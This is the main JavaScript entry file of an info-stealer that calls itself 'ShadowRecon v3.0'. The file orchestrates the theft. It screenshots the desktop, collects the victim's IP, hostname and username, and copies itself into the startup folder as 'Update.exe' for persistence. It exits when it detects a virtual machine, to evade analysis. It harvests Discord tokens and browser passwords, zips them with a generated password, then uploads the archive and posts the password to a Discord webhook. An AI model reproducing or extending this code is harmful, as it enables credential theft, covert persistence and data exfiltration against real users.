/**
 * Main Application Entry Point
 * Clean, modular, and efficient stealer application
 */

const { logger } = require('./core/logger');
const { ErrorHandler } = require('./core/errors');
const config = require('./config/config');
const { fileManager } = require('./core/fileManager');
const { stats } = require('./core/statistics');
const { BrowserCollector } = require('./modules/browsers/collector');
const { DiscordService } = require('./services/discord/service');
const { uploadService } = require('./services/upload/service');
const { ScreenshotCapture } = require('./modules/screenshot/capture');
const CoreUtils = require('./core/utils');

class Application {
    constructor() {
        this.initialized = false;
        this.results = {};
        this.screenshotPath = null;
        
        // Initialize services
        this.browserCollector = new BrowserCollector();
        this.discordService = new DiscordService();
        this.screenshotCapture = new ScreenshotCapture();
        
        // Setup error handlers
        ErrorHandler.setupGlobalHandlers();
    }

    /**
     * Initialize application
     */
    async initialize() {
        try {
            logger.info('Initializing ShadowRecon v3.0');

            // Validate configuration
            if (!config.validate()) {
                throw new Error('Invalid configuration');
            }

            // Note: File manager initialization moved to processAndSend to avoid creating 
            // temporary folders when no Discord tokens are found

            // Collect system information
            await this.collectSystemInfo();

            // Setup persistence if enabled
            await this.setupPersistence();

            this.initialized = true;
            logger.info('Application initialized successfully');
        } catch (error) {
            ErrorHandler.handle(error);
            throw error;
        }
    }

    /**
     * Collect system information
     */
    async collectSystemInfo() {
        try {
            const systemInfo = {
                ip: await CoreUtils.getPublicIp(),
                hostname: await CoreUtils.getHostname(),
                username: CoreUtils.getUsername(),
                platform: process.platform,
                arch: process.arch,
                nodeVersion: process.version
            };

            stats.setSystemInfo(systemInfo);
            logger.info('System information collected', systemInfo);
        } catch (error) {
            logger.error('Failed to collect system information', error.message);
        }
    }

    /**
     * Setup persistence mechanism
     */
    async setupPersistence() {
        try {
            if (!config.get('security.enableSelfDestruct', false)) {
                return;
            }

            const startupPath = config.get('paths.startup');
            const currentExe = process.argv0;
            const targetPath = require('path').join(startupPath, 'Update.exe');

            if (require('fs').existsSync(currentExe)) {
                require('fs').copyFileSync(currentExe, targetPath);
                logger.debug('Persistence setup completed', { target: targetPath });
            }
        } catch (error) {
            logger.debug('Persistence setup failed', error.message);
        }
    }

    /**
     * Capture desktop screenshot at application launch
     * @returns {Promise<string|null>} Path to screenshot file
     */
    async captureInitialScreenshot() {
        try {
            logger.info('Capturing initial desktop screenshot');
            this.screenshotPath = await this.screenshotCapture.captureScreenshot();
            
            if (this.screenshotPath) {
                logger.info('Initial screenshot captured successfully', { path: this.screenshotPath });
            } else {
                logger.warn('Failed to capture initial screenshot');
            }
            
            return this.screenshotPath;
        } catch (error) {
            logger.error('Screenshot capture failed', error.message);
            return null;
        }
    }

    /**
     * Run data collection modules
     */
    async collectData() {
        if (!this.initialized) {
            await this.initialize();
        }

        logger.info('Starting data collection');

        const modules = config.get('modules.enabled');
        const results = {};

        // Discord data collection - check first if Discord tokens exist
        if (modules.discord) {
            try {
                logger.info('Collecting Discord data');
                results.discord = await this.discordService.collectAccounts();
                
                // Exit early if no Discord accounts found
                const discordAccounts = results.discord?.length || 0;
                if (discordAccounts === 0) {
                    logger.info('No Discord tokens found - exiting without collecting other data or creating files');
                    return null; // Return null to indicate no data should be processed
                }
                
                logger.info(`Found ${discordAccounts} Discord accounts - proceeding with data collection`);
            } catch (error) {
                ErrorHandler.handle(error);
                logger.info('Discord data collection failed - exiting without creating files');
                return null; // Return null to indicate no data should be processed
            }
        } else {
            logger.info('Discord module disabled - exiting without creating files');
            return null; // If Discord module is disabled, don't create any files
        }

        // Browser data collection - only if we have Discord tokens
        if (modules.browsers) {
            try {
                logger.info('Collecting browser data');
                results.browsers = await this.browserCollector.collect();
            } catch (error) {
                ErrorHandler.handle(error);
                results.browsers = { error: error.message };
            }
        }

        // Add other modules here as needed
        // if (modules.crypto) { ... }
        // if (modules.files) { ... }
        // if (modules.system) { ... }

        this.results = results;
        
        logger.info('Data collection completed', {
            modules: Object.keys(results),
            browserAccounts: results.browsers?.totalPasswords || 0,
            discordAccounts: results.discord?.length || 0
        });

        return results;
    }

    /**
     * Process and send collected data
     */
    async processAndSend() {
        try {
            logger.info('Processing collected data');

            // Initialize file manager now that we know we have Discord tokens to process
            fileManager.init();

            // Save screenshot to the generated save folder after fileManager is initialized
            if (this.screenshotPath && this.screenshotCapture.screenshotExists()) {
                try {
                    const screenshotBuffer = this.screenshotCapture.getScreenshotBuffer();
                    if (screenshotBuffer) {
                        const filename = require('path').basename(this.screenshotPath);
                        fileManager.saveBuffer(screenshotBuffer, 'Screenshots', filename);
                        logger.info('Screenshot saved to archive folder', { filename });
                    }
                } catch (error) {
                    logger.warn('Failed to save screenshot to archive folder', error.message);
                }
            }

            // Get system info for context
            const systemInfo = stats.getRawData().system;
            const userIp = systemInfo.ip || 'Unknown';

            // Screenshot webhook sending disabled - screenshots are still captured and saved to archive
            if (this.screenshotPath && this.screenshotCapture.screenshotExists()) {
                logger.info('Screenshot captured and saved to archive (webhook sending disabled)');
            } else {
                logger.warn('No screenshot available');
            }

            // Generate password for ZIP file if it should be password protected
            let zipPassword = null;
            if (uploadService.shouldPasswordProtect(fileManager.getZipPath())) {
                zipPassword = CoreUtils.generatePassword(16);
                logger.info('Generated password for ZIP file protection');
            }

            // Create archive (with password if needed)
            const zipPath = await fileManager.createZip(zipPassword);
            const zipSizeMB = fileManager.getZipSizeMB();

            logger.info('Archive created', {
                path: zipPath,
                size: `${zipSizeMB.toFixed(2)} MB`,
                passwordProtected: !!zipPassword
            });

            // Determine if file should be uploaded
            let uploadResult = null;
            if (uploadService.shouldUpload(zipPath)) {
                logger.info('File should be uploaded to external service', {
                    reason: zipPath.toLowerCase().includes('save-') ? 'save-* file pattern' : 'size exceeds limit'
                });
                
                const metadata = zipPassword ? { password: zipPassword } : {};
                try {
                    uploadResult = await uploadService.upload(zipPath, null, metadata);
                    if (uploadResult) {
                        logger.info('File uploaded successfully');
                    } else {
                        logger.warn('Upload failed or disabled - continuing with local file only');
                    }
                } catch (error) {
                    logger.warn('Upload service failed - continuing without upload', {
                        error: error.message
                    });
                    uploadResult = null;
                }
            }

            // SECOND: Send Discord accounts if available (as per requirement: after screenshot)
            if (this.results.discord && Array.isArray(this.results.discord) && this.results.discord.length > 0) {
                await this.discordService.sendAccountEmbeds(this.results.discord, userIp, uploadResult, zipPath, zipPassword);
                logger.info('Sent Discord account embeds (after screenshot)');
            } else {
                // Only send main webhook if no Discord accounts are available
                await this.sendMainWebhook(uploadResult, zipPath, zipPassword);
                logger.info('Sent main webhook (no Discord accounts available)');
            }

            logger.info('Data processing and sending completed');
        } catch (error) {
            ErrorHandler.handle(error);
            throw error;
        }
    }

    /**
     * Send main webhook with statistics
     */
    async sendMainWebhook(uploadResult = null, zipPath = '', zipPassword = null) {
        try {
            const systemInfo = stats.getRawData().system;
            const payload = stats.buildWebhookPayload(
                systemInfo.username,
                systemInfo.hostname,
                systemInfo.ip,
                uploadResult ? uploadResult.downloadUrl : ''
            );

            if (uploadResult && uploadResult.downloadUrl) {
                // Send with link and password if available
                const embed = JSON.parse(payload).embeds[0];
                
                // Add password information to embed if present
                const password = uploadResult.password || zipPassword;
                if (password) {
                    embed.fields = embed.fields || [];
                    embed.fields.push({
                        name: ":key: Archive Password",
                        value: `\`${password}\``,
                        inline: false
                    });
                    embed.fields.push({
                        name: ":warning: Important",
                        value: "This archive is password protected. Use the password above to extract the contents.",
                        inline: false
                    });
                }
                
                await this.discordService.sendWebhook(JSON.parse(JSON.stringify({ embeds: [embed] })));
            } else {
                // Send with file attachment and password info if available
                const embed = JSON.parse(payload).embeds[0];
                
                // Add password information to embed if present
                if (zipPassword) {
                    embed.fields = embed.fields || [];
                    embed.fields.push({
                        name: ":key: Archive Password",
                        value: `\`${zipPassword}\``,
                        inline: false
                    });
                    embed.fields.push({
                        name: ":warning: Important",
                        value: "This archive is password protected. Use the password above to extract the contents.",
                        inline: false
                    });
                }
                
                await this.discordService.sendFile(zipPath, embed);
            }

            logger.info('Main webhook sent successfully');
        } catch (error) {
            logger.error('Failed to send main webhook', error.message);
        }
    }

    /**
     * Cleanup resources
     */
    async cleanup() {
        try {
            logger.info('Cleaning up resources');

            // Clean up temporary files
            fileManager.cleanup();

            // Clean up screenshot files
            if (this.screenshotCapture) {
                this.screenshotCapture.cleanup();
            }

            logger.info('Cleanup completed');
        } catch (error) {
            logger.error('Cleanup failed', error.message);
        }
    }

    /**
     * Run complete application workflow
     */
    async run() {
        try {
            logger.info('Starting ShadowRecon v3.0');

            // FIRST: Capture screenshot immediately at launch (as per requirement)
            await this.captureInitialScreenshot();

            // Initialize application
            await this.initialize();

            // VM detection (if enabled)
            if (config.get('security.enableVmDetection')) {
                const isVm = await CoreUtils.isVirtualMachine();
                if (isVm) {
                    logger.warn('Virtual machine detected, exiting');
                    return;
                }
            }

            // Collect data
            const results = await this.collectData();
            
            // Exit early if no Discord tokens were found (results will be null)
            if (results === null) {
                logger.info('ShadowRecon completed - no Discord tokens found, no files created');
                return;
            }

            // Process and send data (screenshot will be sent first, then embeds)
            await this.processAndSend();

            logger.info('ShadowRecon completed successfully');
        } catch (error) {
            logger.error('Application failed', error.message);
            ErrorHandler.handle(error);
        } finally {
            // Always cleanup
            await this.cleanup();
        }
    }
}

/**
 * Application entry point
 */
async function main() {
    const app = new Application();
    await app.run();
}

// Run application if this file is executed directly
if (require.main === module) {
    main().catch(error => {
        console.error('Unhandled error:', error);
        process.exit(1);
    });
}

module.exports = {
    Application,
    main
};